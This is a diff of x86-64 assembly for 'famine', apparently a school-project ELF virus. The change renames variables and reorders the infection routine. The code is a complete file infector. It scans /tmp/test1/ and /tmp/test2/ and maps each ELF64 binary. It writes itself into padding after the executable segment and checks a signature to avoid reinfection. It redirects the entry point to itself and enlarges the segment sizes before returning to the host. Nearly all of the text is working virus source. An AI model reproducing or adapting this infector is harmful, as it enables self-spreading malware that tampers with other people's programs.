@@ -1,11 +1,9 @@
-; famine elf64 - size 752 bytes
-
 %include "famine.inc"
 
-bits 64
-default rel
-global _start
-section .text
+bits			64
+default			rel
+global			_start
+section			.text
 
 _host:
                 mov         rax, __NR_exit						; empty program
@@ -18,9 +16,9 @@ _start:
                 push        rdx
 
                 lea         rax, [rel _start]
-                mov         rdx, [rel pie_address]
+                mov         rdx, [rel virus_entry]
                 sub         rax, rdx
-                add         rax, [rel entry]
+                add         rax, [rel host_entry]
                 push        rax
 
                 lea         rdi, [rel slash_tmp]
@@ -32,12 +30,12 @@ _start:
                 test        eax, eax
                 jl          .nextdir                
 
-                mov         [rsp-0x100], rax                    ;rsp-0x100 = directory_fd
+                mov         VARS(famine.dir_fd), rax                    ;rsp-0x100 = directory_fd
 
 .readdir:
                 mov         rdx, DIRENT_ARR_SIZE
-                lea         rsi, [rsp-0x800]					; dirent
-                mov         rdi, [rsp-0x100]                    ;directory fd
+                lea         rsi, VARS(famine.dirents)					; dirent
+                mov         rdi, VARS(famine.dir_fd)                    ;directory fd
                 mov         rax, __NR_getdents
                 syscall
                 test        rax, rax
@@ -46,7 +44,7 @@ _start:
                 xor         r13, r13
                 mov         r12, rax
 .file:
-                lea         rdi, [rsp-0x800]                    ; dirent pointer
+                lea         rdi, VARS(famine.dirents)                    ; dirent pointer
                 add         rdi, r13                            ; get next dirent
 
                 movzx       edx, word [rdi + dirent.d_reclen]   ; size of dirent
@@ -63,7 +61,8 @@ _start:
                 jl          .file
                 jmp         .readdir
 
-.closedir:      mov         rdi, [rsp-0x100]                    ; directory fd
+.closedir:
+				mov         rdi, VARS(famine.dir_fd)                    ; directory fd
                 mov         rax, __NR_close
                 syscall
 .nextdir:
@@ -86,14 +85,16 @@ process:                                                        ; expecting file
                                                                 ; directory in r14
                 mov         rsi, r14
                 mov         rax, rdi
-                lea         rdi, [rsp - 0xc00]                  ; file path buffer
+                lea         rdi, VARS(famine.file_path)                  ; file path buffer
                 mov         rdx, rdi                            ; concat directory and filename
 
-.dirname:       movsb
+.dirname:
+				movsb
                 cmp         byte [rsi], 0
                 jnz         .dirname
                 mov         rsi, rax
-.filename:      movsb
+.filename:
+				movsb
                 cmp         byte [rsi - 1], 0
                 jnz         .filename
                 mov         rdi, rdx
@@ -110,22 +111,22 @@ process:                                                        ; expecting file
                 test        eax, eax
                 jl          .return
 
-                mov         [rsp-0x118], rax                    ; rsp-0x118 = infect_fd
+                mov         VARS(famine.file_fd), rax                    ; rsp-0x118 = infect_fd
 
-                lea         rsi, [rsp - 0x300]                  ; rsp-0x300 = fstat buf
+                lea         rsi, VARS(famine.stat)                  ; rsp-0x300 = fstat buf
                 mov         rdi, rax
                 mov         rax, __NR_fstat
                 syscall
                 cmp         rax, 0
                 jnz         .close
 
-                mov         rsi, qword [rsp - (0x300-stat.st_size)]
-                mov         [rsp-0x120], rsi                    ; rsp-0x120 = infect_fsize
+                mov         rsi, qword VARS(famine.stat+stat.st_size)	;[rsp - (0x300-stat.st_size)]
+                mov         VARS(famine.file_size), rsi                    ; rsp-0x120 = infect_fsize
                 cmp         rsi, 0x1000                         ; file too small
                 jl          .close
 
                 xor         r9, r9
-                mov         r8, [rsp-0x118]						; infect_fd
+                mov         r8, VARS(famine.file_fd)						; infect_fd
                 mov         r10, MAP_SHARED
                 mov         rdx, PROT_READ | PROT_WRITE
                                                                 ; rsi is filesize
@@ -135,7 +136,7 @@ process:                                                        ; expecting file
                 cmp         rax, MMAP_ERRORS
                 jae         .close
 
-                mov         [rsp-0x128], rax                    ;rsp-0x128 = infect_mem
+                mov         VARS(famine.file_data), rax                    ;rsp-0x128 = infect_mem
                 mov         rdi, rax
 
                 call        is_valid_elf64
@@ -144,15 +145,18 @@ process:                                                        ; expecting file
 
                 call        insert_elf64
 
-.unmap:         mov         rsi, [rsp-0x120]                    ; infect_fsize
-                mov         rdi, [rsp-0x128]                    ; infect_mem
+.unmap:
+				mov         rsi, VARS(famine.file_size)                    ; infect_fsize
+                mov         rdi, VARS(famine.file_data)                    ; infect_mem
                 mov         rax, __NR_munmap
                 syscall
 
-.close:         mov         rdi, [rsp-0x118]
+.close:
+				mov         rdi, VARS(famine.file_fd)
                 mov         rax, __NR_close
                 syscall
-.return:        ret
+.return:
+				ret
 
 is_valid_elf64:                                                 ; expecing data in rdi
                 xor         rax, rax                            ; result in rax; 1 = valid
@@ -164,86 +168,83 @@ is_valid_elf64:                                                 ; expecing data 
                 mov         rdx, ELF_GNU
                 cmp         qword [rdi], rdx
                 jnz         .return
-.continue:      mov         rdx, ELF64_ET_DYN
+.continue:
+				mov         rdx, ELF64_ET_DYN
                 cmp         qword [rdi + 16], rdx
                 jz          .ok
                 mov         rdx, ELF64_ET_EXEC
                 cmp         qword [rdi + 16], rdx
                 jnz         .return
-.ok:            inc         rax
-.return:        ret
+.ok:
+				inc         rax
+.return:
+				ret
 
-insert_elf64:                                                   ; expecting data in rdi
+insert_elf64:
                 push        r13
                 push        r14
                 push        r15
 
-                mov         r15, rdi
-
+                mov         r15, rdi									; expecting beginning of file data
                 mov         rdx, qword [rdi + elf64_ehdr.e_entry]
-                mov         rax, qword [rdi + elf64_ehdr.e_phoff]
                 movzx       rcx, word [rdi + elf64_ehdr.e_phnum]
-                add         rdi, rax                            ; rdi = *Elf64_Phdr
-.segment:       cmp         rcx, 0
+                mov         rax, qword [rdi + elf64_ehdr.e_phoff]
+                add         rdi, rax									; code segment Elf64_Phdr
+                mov         r14, rdi
+.segment:
+				cmp         rcx, 0
                 jle         .return
-                mov         rax, SEGMENT_TYPE             ; p_flags = PF_X | PF_R, p_type = PT_LOAD
+                mov         rax, SEGMENT_TYPE
                 cmp         rax, qword [rdi]
                 jnz         .next
                 mov         rax, qword [rdi + elf64_phdr.p_vaddr]
                 cmp         rdx, rax
                 jb          .next
                 add         rax, qword [rdi + elf64_phdr.p_memsz]
-                mov         r13, rax                            ; new entry point
+                mov         r13, rax									; new entry point
                 cmp         rdx, rax
-                jae         .next
-
+                jl         .find_space
+.next:
+				add         rdi, elf64_phdr_size
+                dec         rcx
+                jmp         .segment
+.find_space:
+	; abort if not enough empty bytes to write virus
                 mov         rax, qword [rdi + elf64_phdr.p_offset]
                 add         rax, qword [rdi + elf64_phdr.p_filesz]
-
-                mov         r14, rdi                            ; code segment Elf64_Phdr*
-
-	; scan for empty bytes to write virus	
-                lea         rdi, [r15 + rax]                    ; data + p_offset + p_filesz
-                mov         rsi, rdi                            ; save: end of segment
+                lea         rdi, [r15 + rax]							; data + p_offset + p_filesz
+                mov         rsi, rdi									; end of segment
                 xor         al, al
                 mov         rcx, _finish - _start
                 repz        scasb
                 test        rcx, rcx
-                ja          .return                             ; not enough room
-
+                ja          .return
+	; abort if binary  is already infected
                 lea         rdi, [rel _start]
                 xchg        rdi, rsi
                 mov         rax, [rel signature]
                 cmp         rax, qword [rdi - (_finish - signature)]
-                jz          .return                             ; already infected
+                jz          .return
                 mov         rcx, _finish - _start
                 repnz       movsb
-                                                                ;r15 = beginning of file
-                                                                ;r14 = code segment header
-                                                                ;r13 = new entry point
+	; save entrypoints
                 mov         rax, qword [r15 + elf64_ehdr.e_entry]
-                mov         qword [rdi - 16], r13               ; _finish - 16 = pie_address
-                mov         qword [rdi - 8], rax                ; _finish - 8 = entry
-                mov         qword [r15 + elf64_ehdr.e_entry], r13             ; fix entry point
+                mov         qword [rdi - 16], r13						; save virus_entry
+                mov         qword [rdi - 8], rax						; save host_entry
+	; update binary headers
+                mov         qword [r15 + elf64_ehdr.e_entry], r13		; set new entrypoint to virus
                 mov         rax, _finish - _start
-                add         qword [r14 + elf64_phdr.p_filesz], rax             ; increase p_filesz
-                add         qword [r14 + elf64_phdr.p_memsz], rax             ; increase p_memsz
-                jmp         .return
-
-.next:          add         rdi, elf64_phdr_size                           ; sizeof(Elf64_Phdr)
-                dec         rcx
-                jmp         .segment
-
+                add         qword [r14 + elf64_phdr.p_filesz], rax		; increase p_filesz
+                add         qword [r14 + elf64_phdr.p_memsz], rax		; increase p_memsz
 .return:
                 pop         r15
                 pop         r14
                 pop         r13
                 ret
 
-; Data
-
+	; persistent Data
 slash_tmp       db          "/tmp/test1/",0,"/tmp/test2/",0,0
 signature       db          "famine! linux @42siliconvalley",0
-pie_address     dq          (_start - _host)
-entry           dq          0
+virus_entry     dq          _start
+host_entry      dq          _host
 _finish:
